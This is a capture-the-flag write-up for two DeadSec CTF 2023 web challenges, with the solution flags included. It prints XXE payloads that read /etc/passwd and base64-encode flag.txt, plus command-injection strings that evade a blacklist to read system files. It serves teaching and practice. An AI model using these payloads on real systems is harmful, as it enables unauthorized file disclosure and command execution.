#  DeadSec CTF 2023
DeadSec CTF 2023 is an online jeopardy-style CTF organized by DeadSec Team.

## Web
### XEE (50pts)
flag in flag.txt
Target: target.deadsec.quest

The website prompt us common login page with username and password as input. As the title stated, it's about XXE vulnerability. We can see the request detail using BurpSuite. We first try the classic payload to retrieve ``passwd`` file.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
	<username>&xxe;</username>
	<password>mypass</password>
</user>
```
And it works. Now, the description says that the flag is inside flag.txt file. But, changing the file path to flag.txt gives us permissions error. So now lets try to use PHP Wrapper inside XXE.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/../flag.txt"> ]>
<user>
	<username>&xxe;</username>
	<password>mypass</password>
</user>
```
Which gives us:
```
<result>
<code>0</code>
<msg>ZGVhZHtuMWNlX2JyMF9YRTNfM3pfaDNoM30K</msg>
</result>
```
```
FLAG: dead{n1ce_br0_XE3_3z_h3h3}
```

### Bing (50pts)
The site shows us a ping tool with an input box. I tried to submit 8.8.8.8 but it says ``error when executing command: 8.8.8.8``. Now this error looks so familiar when you enter improper command in linux. Thus, this could be a command injection vulnerability.

I tried to submit ``ls`` and it says ``Oh no no, dont hack my website :)))``.
Now we know that some inputs are blacklisted. After a while, I know that it blacklists whitespaces, quotes, ``cat``, etc.

So I tried bypass with backslash and it works. 
```
c\a\t</etc/passwd
```
Now let's get the flag.txt.

```
c\a\t</f\l\a\g\.\t\x\t
```
This command works but it doesn't give us the flag. 
It says: `` <pre>You can read flag !!!</pre>``
So I tried to encode the file to base64 and decode it later, just like in previous challenge.
```
base64${IFS}/f\l\a\g\.\t\x\t
```
And boom, we get the flag. The $IFS here acts as a separator to the positional parameters.
`` <pre>ZGVhZHtva29rb2shISFfdGgxc19mbEFnX2YwUl9ZMFV9Cg==
</pre>``

```
FLAG: dead{okokok!!!_th1s_flAg_f0R_Y0U}
```
